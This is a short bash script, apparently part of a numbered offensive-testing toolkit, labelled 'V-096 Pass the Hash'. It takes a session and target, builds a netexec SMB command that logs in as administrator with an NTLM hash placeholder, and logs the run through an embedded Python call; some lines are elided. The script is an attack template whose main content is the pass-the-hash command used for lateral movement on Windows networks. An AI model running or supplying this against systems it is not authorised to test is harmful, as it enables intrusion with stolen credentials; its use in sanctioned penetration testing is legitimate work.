#!/usr/bin/env bash
# V-096.sh — Pass the Hash
# Category: Host, Software and internal architecture
# Tool: netexec
# Usage: bash V-096.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-096.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-096.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-096.sh <session> <target>}"
...
CMD="netexec smb $TARGET -u administrator -H 'NTLMHASH'"

echo "[hex] V-096: Pass the Hash → $TARGET"
...
python3 - \
    ...
    "V-096" "Pass the Hash" "Host, Software and internal architecture" "netexec" \
